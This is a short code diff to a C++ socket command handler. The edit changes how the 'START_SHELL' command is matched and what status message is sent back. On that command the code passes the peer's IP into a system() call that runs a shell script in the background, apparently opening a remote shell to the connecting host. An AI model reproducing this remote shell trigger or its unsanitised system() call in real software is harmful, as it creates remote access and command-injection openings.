@@ -357,9 +357,9 @@ void executor::execute(std::string str)
 	reac_communication *reac = (reac_communication *)_ref;
 	std::cout<<str<<std::endl;
 
-	if (str == "START_SHELL") {
-		reac->write_to_socket("Shell : Starting\n");
+	if (str.substr(0,11) == "START_SHELL") {
 		system(("/bin/sh ./executor/server_script "+reac->getIP()+" &").c_str());
+		reac->write_to_socket("[[Status : 1]]\n");
 	} else if (str == "EXIT") {
 		reac->close();
 	} else if (str.substr(0,5) == "KILL_") {
